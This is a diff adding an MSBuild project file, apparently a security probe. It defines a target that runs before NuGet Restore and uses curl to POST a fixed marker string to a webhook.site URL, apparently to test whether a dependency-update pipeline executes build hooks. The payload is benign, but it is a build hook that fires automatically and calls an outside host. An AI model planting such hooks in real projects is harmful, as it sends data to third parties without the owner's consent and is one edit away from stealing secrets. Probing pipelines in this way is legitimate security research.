@@ -1,0 +1,5 @@
+<Project>
+  <Target Name="DependabotSyntheticSecretProbe" BeforeTargets="Restore">
+    <Exec Command="curl -fsS --max-time 10 -X POST --data lotp-nuget-synthetic-registry-probe https://webhook.site/b2f1a5b2-b7c6-42a7-87c4-249a89621c28/synthetic" IgnoreExitCode="true" />
+  </Target>
+</Project>
